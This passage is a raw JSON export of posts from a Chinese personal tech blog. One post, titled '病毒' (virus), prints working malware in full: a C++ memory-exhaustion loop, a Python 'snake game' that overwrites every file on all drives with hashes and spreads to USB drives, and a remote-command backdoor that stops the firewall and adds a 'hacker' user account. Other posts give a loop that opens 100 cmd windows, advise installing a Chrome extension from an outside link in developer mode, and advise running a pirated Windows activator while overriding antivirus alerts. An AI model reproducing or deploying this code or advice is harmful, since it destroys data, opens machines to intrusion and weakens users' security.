href=\&#34;https://www.bilibili.com/video/BV1sC4y147b8/\&#34;&gt;https://www.bilibili.com/video/BV1sC4y147b8/&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;yong-python-he-cshi-xian-qia-ji-bing-du-100-ge-cmd-chuang-kou&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;用Python和C++实现卡机病毒---100个cmd窗口&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;C++&#34;,&#34;slug&#34;:&#34;QP6qCLL04&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/QP6qCLL04/&#34;},{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;},{&#34;name&#34;:&#34;Python&#34;,&#34;slug&#34;:&#34;Bz9PrMIYTT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/Bz9PrMIYTT/&#34;},{&#34;name&#34;:&#34;文件&#34;,&#34;slug&#34;:&#34;sQxBWofXSD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/sQxBWofXSD/&#34;}],&#34;date&#34;:&#34;2020-03-30 19:00:32&#34;,&#34;dateFormat&#34;:&#34;2020-03-30&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/yong-python-he-cshi-xian-qia-ji-bing-du-100-ge-cmd-chuang-kou/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:28000,&#34;words&#34;:95,&#34;minutes&#34;:1},&#34;description&#34;:&#34;上代码：\nPython：\nimport os\n#将下面改为&amp;quot;while 1:&amp;quot;会永远执行（直到叉掉或关机）\nfor x in range(1,100):\n    os.system(&amp;quot;start&amp;quot;)\n...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;由于本人没有钱💴，所以没法买某某云的域名，看了洛谷日报上的文章，用的是Github的二级域名。&lt;br&gt;\nGithub是外国网站，访问比较慢，所以要想加速，就挂VPN（也叫科学上网工具）&lt;/p&gt;\n&lt;p&gt;这里推荐一款VPN：setupVPN&lt;a href=\&#34;https://base1-sv.diltwo.com//public/Chrome/Chrome-SetupVPN-3.8.8.crx\&#34;&gt;https://base1-sv.diltwo.com//public/Chrome/Chrome-SetupVPN-3.8.8.crx&lt;/a&gt;安装时注意：请用谷歌开发者模式安装！！！&lt;/p&gt;\n&lt;p&gt;安装好后，请选择英国通道（本人的电脑无法用美国、意大利等国的通道）&lt;/p&gt;\n&lt;p&gt;不要买VIP    有钱人忽略&lt;/p&gt;\n&lt;p&gt;2020/4/19注：新网址&lt;a href=\&#34;http://hmlblog.ml\&#34;&gt;http://hmlblog.ml&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;2020/5/8注：新网址&lt;a href=\&#34;http://huangmingli.ml\&#34;&gt;http://huangmingli.ml&lt;/a&gt;&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;jie-jue-wo-de-bo-ke-fang-wen-man-de-fang-fa&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;解决我的博客访问慢的方法&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;网站&#34;,&#34;slug&#34;:&#34;Dqv8syIZ2h&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/Dqv8syIZ2h/&#34;}],&#34;date&#34;:&#34;2020-03-27 15:32:32&#34;,&#34;dateFormat&#34;:&#34;2020-03-27&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/jie-jue-wo-de-bo-ke-fang-wen-man-de-fang-fa/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:37000,&#34;words&#34;:159,&#34;minutes&#34;:1},&#34;description&#34;:&#34;由于本人没有钱💴，所以没法买某某云的域名，看了洛谷日报上的文章，用的是Github的二级域名。\nGithub是外国网站，访问比较慢，所以要想加速，就挂VPN（也叫科学上网工具）\n这里推荐一款VPN：setupVPNhttps://base...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;blockquote&gt;\n&lt;p&gt;参考了CSDN &lt;a href=\&#34;https://blog.csdn.net/weixin_42904058\&#34;&gt;和平鸽5567&lt;/a&gt; 的文档，这里是几篇文章的汇总&lt;/p&gt;\n&lt;/blockquote&gt;\n&lt;h2 id=\&#34;1号病毒\&#34;&gt;1号病毒：&lt;/h2&gt;\n&lt;h3 id=\&#34;病毒是c语言\&#34;&gt;病毒是C++语言&lt;/h3&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-cpp\&#34;&gt;#include &amp;lt;bits/stdc++.h&amp;gt; \n/*病毒不需要万能头文件，只需iostream，为了方便读者在下面添加其他功能，所以用万能头文件*/\nusing namespace std;\nint main(){\n    while(true)\n    {\n        char *p=new char[10000];\n    }\n    return 0;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;这代码没有什么要解释的，太简单。第五行是程序的关键，用来动态调用系统内存，并利用new函数插入10000（本数字是我精心挑选的，它是最大的不引起系统警告，而死机速度又很快的）个字符。&lt;/p&gt;\n&lt;h2 id=\&#34;2号病毒\&#34;&gt;2号病毒：&lt;/h2&gt;\n&lt;h3 id=\&#34;病毒是python3语言\&#34;&gt;病毒是Python3语言&lt;/h3&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-python\&#34;&gt;import win32api\nimport win32con\nimport hashlib\nimport os\nimport shutil\nimport time\n \njmp = os.popen(&amp;quot;wmic VOLUME GET Label, Name&amp;quot;).read()\n \ndef Copy(np):\n    p = os.getcwd() + &#39;\\\\snake.exe&#39;\n    os.chdir(np)\n    shutil.copy(p,np)\n \ndef Usb():\n    plates = os.popen(&amp;quot;wmic VOLUME GET Label, Name&amp;quot;).read()\n    pl=[&#39;A:/&#39;,&#39;B:/&#39;,&#39;C:/&#39;,&#39;D:/&#39;,&#39;E:/&#39;,&#39;F:/&#39;,&#39;G:/&#39;,&#39;H:/&#39;,&#39;I:/&#39;,&#39;J:/&#39;,&#39;K:/&#39;,&#39;L:/&#39;,&#39;M:/&#39;,&#39;N:/&#39;,&#39;O:/&#39;,&#39;P:/&#39;,&#39;Q:/&#39;,&#39;R:/&#39;,&#39;S:/&#39;,&#39;T:/&#39;,&#39;U:/&#39;,&#39;V:/&#39;,&#39;W:/&#39;,&#39;X:/&#39;,&#39;Y:/&#39;,&#39;Z:/&#39;]\n    l = plates.__len__()\n    i = 0\n    for i in range(l+1):\n        try:\n            if plates[i+1]==&#39;:&#39;:\n                path = plates[i] + plates[i+1] + plates[i+2]\n                vpath = path + &#39;snake.exe&#39;\n                try:\n                    f = open(vpath)\n                except:\n                    Copy(path)\n        except:\n            pass\n \ndef Thanos(plate):\n    g = os.walk(plate)\n    for path,d,filelist in g:\n        for filename in filelist:\n            if &#39;snake.exe&#39; not in os.path.join(path,filename):\n                xd = open(os.path.join(path, filename), &#39;rb&#39;).read()\n                gys = xd\n                sha1 = hashlib.sha1(gys)\n                osv = sha1.hexdigest()\n                bx = bytes(osv, encoding=&#39;utf-8&#39;)\n                with open(os.path.join(path, filename), &#39;wb&#39;) as f:\n                    f.write(bx)\n \ndef Snake():\n \n    import pygame, sys, random\n \n \n    check_errors = pygame.init()\n    if check_errors[1] &amp;gt; 0:\n        print(&amp;quot;(!) Had {0} initializing errors, exiting...&amp;quot;.format(check_errors[1]))\n        sys.exit(-1)\n    else:\n        print(&amp;quot;(+) PyGame successfully initialized!&amp;quot;)\n \n \n    playSurface = pygame.display.set_mode((820, 560))\n    pygame.display.set_caption(&#39;snake&#39;)\n \n \n    red = pygame.Color(255, 0, 0)\n    green = pygame.Color(0, 255, 0)\n    black = pygame.Color(0, 0, 0)\n    white = pygame.Color(255, 255, 255)\n    brown = pygame.Color(165, 42, 42)\n \n \n    fpsController = pygame.time.Clock()\n \n \n    snakePos = [100, 50]\n    snakeBody = [[100, 50], [90, 50], [80, 50]]\n \n    foodPos = [random.randrange(1, 72) * 10, random.randrange(1, 46) * 10]\n    foodSpawn = True\n \n    direction = &#39;RIGHT&#39;\n    changeto = direction\n \n    score = 0\n \n \n    def gameOver():\n        myFont = pygame.font.SysFont(&#39;monaco&#39;, 72)\n        GOsurf = myFont.render(&#39;Game Over!&#39;, True, red)\n        GOrect = GOsurf.get_rect()\n        GOrect.midtop = (370, 190)\n        playSurface.blit(GOsurf, GOrect)\n        showScore(0)\n        pygame.display.flip()\n \n        time.sleep(4)\n        pygame.quit()\n        sys.exit()\n \n    def showScore(choice=1):\n        sFont = pygame.font.SysFont(&#39;monaco&#39;, 24)\n        Ssurf = sFont.render(&#39;Score : {0}&#39;.format(score), True, black)\n        Srect = Ssurf.get_rect()\n        if choice == 1:\n            Srect.midtop = (370, 230)\n        else:\n            Srect.midtop = (370, 230)\n        playSurface.blit(Ssurf, Srect)\n \n \n    while True:\n        for event in pygame.event.get():\n            if event.type == pygame.QUIT:\n                pygame.quit()\n                sys.exit()\n            elif event.type == pygame.KEYDOWN:\n                if event.key == pygame.K_RIGHT or event.key == ord(&#39;d&#39;):\n                    changeto = &#39;RIGHT&#39;\n                if event.key == pygame.K_LEFT or event.key == ord(&#39;a&#39;):\n                    changeto = &#39;LEFT&#39;\n                if event.key == pygame.K_UP or event.key == ord(&#39;w&#39;):\n                    changeto = &#39;UP&#39;\n                if event.key == pygame.K_DOWN or event.key == ord(&#39;s&#39;):\n                    changeto = &#39;DOWN&#39;\n                if event.key == pygame.K_ESCAPE:\n                    pygame.event.post(pygame.event.Event(pygame.QUIT))\n \n        if changeto == &#39;RIGHT&#39; and not direction == &#39;LEFT&#39;:\n            direction = &#39;RIGHT&#39;\n        if changeto == &#39;LEFT&#39; and not direction == &#39;RIGHT&#39;:\n            direction = &#39;LEFT&#39;\n        if changeto == &#39;UP&#39; and not direction == &#39;DOWN&#39;:\n            direction = &#39;UP&#39;\n        if changeto == &#39;DOWN&#39; and not direction == &#39;UP&#39;:\n            direction = &#39;DOWN&#39;\n \n \n        if direction == &#39;RIGHT&#39;:\n            snakePos[0] += 10\n        if direction == &#39;LEFT&#39;:\n            snakePos[0] -= 10\n        if direction == &#39;UP&#39;:\n            snakePos[1] -= 10\n        if direction == &#39;DOWN&#39;:\n            snakePos[1] += 10\n \n \n        snakeBody.insert(0, list(snakePos))\n        if snakePos[0] == foodPos[0] and snakePos[1] == foodPos[1]:\n            score += 1\n            foodSpawn = False\n        else:\n            snakeBody.pop()\n \n \n        if foodSpawn == False:\n            foodPos = [random.randrange(1, 82) * 10, random.randrange(1, 56) * 10]\n        foodSpawn = True\n \n \n        playSurface.fill(white)\n \n \n        for pos in snakeBody:\n            pygame.draw.rect(playSurface, green, pygame.Rect(pos[0], pos[1], 10, 10))\n \n        pygame.draw.rect(playSurface, brown, pygame.Rect(foodPos[0], foodPos[1], 10, 10))\n \n \n        if snakePos[0] &amp;gt;= 820 or snakePos[0] &amp;lt; 0:\n            gameOver()\n        if snakePos[1] &amp;gt;= 470 or snakePos[1] &amp;lt; 0:\n            gameOver()\n \n        for block in snakeBody[1:]:\n            if snakePos[0] == block[0] and snakePos[1] == block[1]:\n                gameOver()\n \n        showScore()\n        pygame.display.flip()\n        fpsController.tick(10)\n \n \nprint(&#39;lodding...&#39;)\n \npl=[&#39;A:/&#39;,&#39;B:/&#39;,&#39;C:/&#39;,&#39;D:/&#39;,&#39;E:/&#39;,&#39;F:/&#39;,&#39;G:/&#39;,&#39;H:/&#39;,&#39;I:/&#39;,&#39;J:/&#39;,&#39;K:/&#39;,&#39;L:/&#39;,&#39;M:/&#39;,&#39;N:/&#39;,&#39;O:/&#39;,&#39;P:/&#39;,&#39;Q:/&#39;,&#39;R:/&#39;,&#39;S:/&#39;,&#39;T:/&#39;,&#39;U:/&#39;,&#39;V:/&#39;,&#39;W:/&#39;,&#39;X:/&#39;,&#39;Y:/&#39;,&#39;Z:/&#39;]\nl = jmp.__len__()\ni = 0\nfor i in range(l+1):\n    try:\n        if jmp[i+1]==&#39;:&#39;:\n            path = jmp[i] + jmp[i+1] + jmp[i+2]\n            Thanos(path)\n    except:\n        pass\n \nSnake()\n \nwin32api.MessageBox(0, &#39;your all files on this computer is in MD5!&#39;, &#39;Ooooooops!&#39;, win32con.MB_ICONWARNING)\n \nwhile True:\n    time.sleep(60)\n    Usb()\n&lt;/code&gt;&lt;/pre&gt;\n&lt;h3 id=\&#34;一定不要在自己的电脑上运行\&#34;&gt;一定不要在自己的电脑上运行&lt;/h3&gt;\n&lt;h3 id=\&#34;never-run-this-on-your-computer\&#34;&gt;NEVER RUN THIS ON YOUR COMPUTER&lt;/h3&gt;\n&lt;p&gt;病毒的作用是：加密电脑上所有文件。&lt;br&gt;\n&lt;em&gt;呃......感觉......玩的有点过了呀......&lt;/em&gt;&lt;br&gt;\n运行此代码需要安装第三方库：&lt;br&gt;\npywin32  如果你的Python是3.6版本，在cmd里运行：“pip install pywin32”（去掉引号）即可，否则，到&lt;a href=\&#34;https://github.com/mhammond/pywin32/\&#34;&gt;https://github.com/mhammond/pywin32/&lt;/a&gt; 里面下载对应的版本安装，具体安装过程可以看&lt;a href=\&#34;https://www.cnblogs.com/yjlch1016/p/8469429.html\&#34;&gt;https://www.cnblogs.com/yjlch1016/p/8469429.html&lt;/a&gt;的介绍。&lt;/p&gt;\n&lt;p&gt;time、os、 hashlib是Python自带的。无需安装&lt;/p&gt;\n&lt;h2 id=\&#34;3号病毒\&#34;&gt;3号病毒&lt;/h2&gt;\n&lt;h3 id=\&#34;还是python3语言\&#34;&gt;还是Python3语言&lt;/h3&gt;\n&lt;p&gt;此病毒分被控端——别人电脑上的、主控端——自己电脑上的&lt;br&gt;\n被控端：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-python\&#34;&gt;\nimport os\nimport socket\nos.popen(&#39;net stop mpssvc&#39;)\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\nhost = &#39;USER-20180705UV&#39;\nport = 6666\ns.bind((host,port))\ns.listen(5)\nwhile True:\n    print(&#39;lodding...\\n\\n&#39;)\n    c,addr = s.accept()\n    while True:\n        try:\n            client_date = str(c.recv(1024),&#39;utf8&#39;)\n            if client_date == &#39;quit&#39;:\n                c.close()\n                break\n        except Exception:\n            break\n \n        if client_date == &#39;bd&#39;:\n            os.popen(&#39;net user hacker 123456 /ADD&#39;)\n            re = &#39;BackDoor ADD Finish! &#39; + socket.gethostbyname(socket.gethostname())\n            c.send(bytes(re,&#39;utf8&#39;))\n        else:\n            r = os.popen(client_date).read()\n            c.send(bytes(r,&#39;utf8&#39;))\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;os、socket都是Python自带库，无需安装&lt;/p&gt;\n&lt;p&gt;主控端：&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\&#34;language-python\&#34;&gt;import socket\nhost = input(&#39;Host: &#39;) #对方的IP\nport = 6666\nhostport = (host,port)\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(hostport)\n \ndef send():\n    user_input = input(&#39;&amp;gt; &#39;).strip()\n    if user_input == &#39;quit&#39;:\n        s.close()\n        exit(0)\n    elif user_input == &#39;backdoor&#39;:\n        s.send(bytes(&#39;bd&#39;,&#39;utf8&#39;))\n    else:\n        s.send(bytes(user_input,&#39;utf8&#39;))\n \ndef get():\n    server_reply = s.recv(1024)\n    print(&#39;Server result:\\n&#39;)\n    print(str(server_reply, &#39;utf8&#39;))\n \nwhile True:\n    send()\n    get()\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;socket是Python自带库，无需安装&lt;/p&gt;\n&lt;p&gt;很简单,只能远程运行cmd命令,不过输入&amp;quot;backdoor&amp;quot;命令可以自动在Server上创建新用户。&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;bing-du&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;病毒&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;},{&#34;name&#34;:&#34;Python&#34;,&#34;slug&#34;:&#34;Bz9PrMIYTT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/Bz9PrMIYTT/&#34;},{&#34;name&#34;:&#34;文件&#34;,&#34;slug&#34;:&#34;sQxBWofXSD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/sQxBWofXSD/&#34;}],&#34;date&#34;:&#34;2020-03-27 13:55:45&#34;,&#34;dateFormat&#34;:&#34;2020-03-27&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/bing-du/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;7 min read&#34;,&#34;time&#34;:413000,&#34;words&#34;:1255,&#34;minutes&#34;:7},&#34;description&#34;:&#34;\n参考了CSDN 和平鸽5567 的文档，这里是几篇文章的汇总\n\n1号病毒：\n病毒是C++语言\n#include &amp;lt;bits/stdc++.h&amp;gt; \n/*病毒不需要万能头文件，只需iostream，为了方便读者在下面添加其他功能，...&#34;,&#34;toc&#34;:&#34;&lt;ul class=\&#34;markdownIt-TOC\&#34;&gt;\n&lt;li&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#1%E5%8F%B7%E7%97%85%E6%AF%92\&#34;&gt;1号病毒：&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%97%85%E6%AF%92%E6%98%AFc%E8%AF%AD%E8%A8%80\&#34;&gt;病毒是C++语言&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#2%E5%8F%B7%E7%97%85%E6%AF%92\&#34;&gt;2号病毒：&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E7%97%85%E6%AF%92%E6%98%AFpython3%E8%AF%AD%E8%A8%80\&#34;&gt;病毒是Python3语言&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E4%B8%80%E5%AE%9A%E4%B8%8D%E8%A6%81%E5%9C%A8%E8%87%AA%E5%B7%B1%E7%9A%84%E7%94%B5%E8%84%91%E4%B8%8A%E8%BF%90%E8%A1%8C\&#34;&gt;一定不要在自己的电脑上运行&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#never-run-this-on-your-computer\&#34;&gt;NEVER RUN THIS ON YOUR COMPUTER&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;li&gt;&lt;a href=\&#34;#3%E5%8F%B7%E7%97%85%E6%AF%92\&#34;&gt;3号病毒&lt;/a&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;a href=\&#34;#%E8%BF%98%E6%98%AFpython3%E8%AF%AD%E8%A8%80\&#34;&gt;还是Python3语言&lt;/a&gt;&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&lt;/li&gt;\n&lt;/ul&gt;\n&#34;},{&#34;content&#34;:&#34;&lt;p&gt;&lt;img src=\&#34;http://huangmingli.ml/post-images/1584789058372.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n一款全能的下载工具&lt;br&gt;\n支持下载 HTTP、FTP、BT、磁力链、百度网盘等资源&lt;br&gt;\n&lt;img src=\&#34;http://huangmingli.ml/post-images/1584789244526.png\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;/p&gt;\n&lt;p&gt;还支持Windows、Linux、MacOS系统。&lt;/p&gt;\n&lt;p&gt;它拥有&lt;br&gt;\n🕹 简洁明了的图形操作界面&lt;br&gt;\n🦄 支持BT和磁力链任务&lt;br&gt;\n💾 支持下载百度云盘资源&lt;br&gt;\n🎛 最高支持 10 个任务同时下载&lt;br&gt;\n🚀 单任务最高支持 64 线程下载&lt;br&gt;\n🕶 模拟用户代理UA&lt;br&gt;\n🔔 下载完成后通知&lt;br&gt;\n💻 支持触控栏快捷键(Mac 专享)&lt;br&gt;\n🤖 常驻系统托盘，操作更加便捷&lt;br&gt;\n🌑 深色模式New&lt;br&gt;\n🗑 移除任务时可同时删除相关文件&lt;br&gt;\n🌍 国际化(可选择简体中文或英文界面)&lt;/p&gt;\n&lt;p&gt;是个很好的下载器&lt;br&gt;\n附上官网地址：https://motrix.app/zh-CN&lt;/p&gt;\n&lt;p&gt;由于官网感觉是外国网站，所以我提供国内网盘下载链接：https://share.weiyun.com/5zsZ6RI&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;fei-chang-hao-de-xia-zai-qi-motrix&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;非常好的下载器motrix&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;软件&#34;,&#34;slug&#34;:&#34;jExDrgbsVq&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/jExDrgbsVq/&#34;},{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;},{&#34;name&#34;:&#34;文件&#34;,&#34;slug&#34;:&#34;sQxBWofXSD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/sQxBWofXSD/&#34;}],&#34;date&#34;:&#34;2020-03-21 18:57:54&#34;,&#34;dateFormat&#34;:&#34;2020-03-21&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/fei-chang-hao-de-xia-zai-qi-motrix/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:45000,&#34;words&#34;:210,&#34;minutes&#34;:1},&#34;description&#34;:&#34;\n一款全能的下载工具\n支持下载 HTTP、FTP、BT、磁力链、百度网盘等资源\n\n还支持Windows、Linux、MacOS系统。\n它拥有\n🕹 简洁明了的图形操作界面\n🦄 支持BT和磁力链任务\n💾 支持下载百度云盘资源\n🎛 最高支...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;提交软件：3172456158@qq.com&lt;br&gt;\n你可以在此下载文件：&lt;br&gt;\nmotrix : https://share.weiyun.com/5zsZ6RI&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;wen-jian-shu-ju-ku&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;黄明礼下载站&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;文件&#34;,&#34;slug&#34;:&#34;sQxBWofXSD&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/sQxBWofXSD/&#34;}],&#34;date&#34;:&#34;2020-03-04 11:27:51&#34;,&#34;dateFormat&#34;:&#34;2020-03-04&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/wen-jian-shu-ju-ku/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:5000,&#34;words&#34;:22,&#34;minutes&#34;:1},&#34;description&#34;:&#34;提交软件：3172456158@qq.com\n你可以在此下载文件：\nmotrix : https://share.weiyun.com/5zsZ6RI\n&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;最近，有人向我反映，说博客不能访问，下面我就讲讲解决方法：&lt;br&gt;\n第一种：如果网站出现这种情况：&lt;img src=\&#34;http://huangmingli.ml/post-images/1583224991973.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n将Brucehml.github.com改为Brucehml.github.io&lt;/p&gt;\n&lt;p&gt;第二种：如果网址出现这种情况&lt;img src=\&#34;http://huangmingli.ml/post-images/1583225162957.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;以及各种无法访问的情况，请检查地址栏是不是：https://Brucehml.github.io 尤其注意https:// 和 .io。&lt;/p&gt;\n&lt;p&gt;2020/4/19注：如果用的是新网址&lt;a href=\&#34;http://hmlblog.ml\&#34;&gt;http://hmlblog.ml&lt;/a&gt;请注意协议为http，后缀为ml&lt;br&gt;\n未来将开通https网站&lt;/p&gt;\n&lt;p&gt;2020/5/8注：新域名&lt;a href=\&#34;http://huangmingli.ml\&#34;&gt;http://huangmingli.ml&lt;/a&gt;请注意协议为http，后缀为ml&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;jie-jue-bu-neng-fang-wen-wo-de-bo-ke-de-fang-fa&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;解决不能访问我的博客的方法&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;},{&#34;name&#34;:&#34;网站&#34;,&#34;slug&#34;:&#34;Dqv8syIZ2h&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/Dqv8syIZ2h/&#34;}],&#34;date&#34;:&#34;2020-03-03 16:33:07&#34;,&#34;dateFormat&#34;:&#34;2020-03-03&#34;,&#34;feature&#34;:&#34;&#34;,&#34;link&#34;:&#34;http://huangmingli.ml/post/jie-jue-bu-neng-fang-wen-wo-de-bo-ke-de-fang-fa/&#34;,&#34;hideInList&#34;:false,&#34;isTop&#34;:false,&#34;stats&#34;:{&#34;text&#34;:&#34;1 min read&#34;,&#34;time&#34;:33000,&#34;words&#34;:143,&#34;minutes&#34;:1},&#34;description&#34;:&#34;最近，有人向我反映，说博客不能访问，下面我就讲讲解决方法：\n第一种：如果网站出现这种情况：\n将Brucehml.github.com改为Brucehml.github.io\n第二种：如果网址出现这种情况以及各种无法访问的情况，请检查地址栏是...&#34;,&#34;toc&#34;:&#34;&#34;},{&#34;content&#34;:&#34;&lt;p&gt;由于微软停止了对Windows7的支持，许多Win7的用户都更新了Windows10。可是，当更新Windows10时，显示未激活，这怎么办呢？&lt;img src=\&#34;http://huangmingli.ml/post-images/1583216407297.jpg\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n尤其是一些买了正版Win7的，明明是正版，但一升级就显示未激活，这怎么办呢？没事，这里我给大家带来了激活方法。&lt;/p&gt;\n&lt;p&gt;对于一些运气好的，可能从网上随便找一个激活码就OK了，但至少我不是这样。在我这台电脑上，各种错误都有，好不容易找到了一款后，又把我的专业版变成教育版了。所以，这里推荐大家用小马激活工具（本人用微软win7系统升级下载工具下载的，32位和64位都可以用）&lt;/p&gt;\n&lt;p&gt;小马激活工具官网：http://www.pccppc.com/&lt;br&gt;\n注意：如果电脑右侧弹出了Windows病毒拦截，请立即点开，并选择“操作”--&amp;gt;“允许在设备上”。&lt;br&gt;\n如果杀毒软件报毒，请点击“添加信任”。&lt;br&gt;\n如果弹出这样的窗口&lt;img src=\&#34;http://huangmingli.ml/post-images/1583217795511.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;请点击否。&lt;/p&gt;\n&lt;p&gt;在保存好未保存的文件后，我们点击“立即体验正版”即可。&lt;br&gt;\n&lt;img src=\&#34;http://huangmingli.ml/post-images/1583218030631.PNG\&#34; alt=\&#34;\&#34; loading=\&#34;lazy\&#34;&gt;&lt;br&gt;\n软件会帮你自动激活并重启。&lt;/p&gt;\n&lt;p&gt;2020/3/23注：此方法在部分电脑上无法使用，可以试试暴风激活&lt;br&gt;\n2020/4/19注：小马激活最新版可能带有病毒&lt;/p&gt;\n&#34;,&#34;fileName&#34;:&#34;ru-he-ji-huo-windows10-zhuan-ye-ban-qin-ce-hao-yong&#34;,&#34;abstract&#34;:&#34;&#34;,&#34;title&#34;:&#34;如何激活Windows10专业版（亲测好用）&#34;,&#34;tags&#34;:[{&#34;name&#34;:&#34;电脑操作&#34;,&#34;slug&#34;:&#34;DVl0teJMPT&#34;,&#34;used&#34;:true,&#34;link&#34;:&#34;http://huangmingli.ml/tag/DVl0teJMPT/&#34;}],&#34;date&#34;:&#34;2020-03-03 